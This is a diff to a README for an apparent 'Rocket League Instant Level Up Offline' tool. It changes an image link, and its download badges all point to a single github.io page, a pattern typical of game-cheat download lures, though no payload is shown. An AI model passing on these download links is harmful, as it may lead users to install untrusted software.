@@ -2,7 +2,7 @@
 
 [![Download Instant Level Up](https://img.shields.io/badge/Download-Instant_Level_Up-blueviolet)](https://rocket-league-instant-level-up-offline.github.io/.github)
 
-![Rocket League Offline Setup]([https://i.imgur.com/VY7Pvfs.jpg](https://us-west-2-epicgames.graphassets.com/A0Gpf4ZpfQzaTePr3NRc1z/resize=fit:clip,height:720,width:1280/output=format:webp/5oPZyiFQ3qmS83SjK8Ku))
+![Rocket League Offline Setup](https://cdn-0001.qstv.on.epicgames.com/VgkKglVjDwOePXsggv/image/landscape_comp.jpeg))
 
 [![Download Combat Guide](https://img.shields.io/badge/Download-Combat_Guide-blueviolet)](https://rocket-league-instant-level-up-offline.github.io/.github)  
 [![Platform](https://img.shields.io/badge/Platform-Multi_Platform-informational)](https://rocket-league-instant-level-up-offline.github.io/.github)  
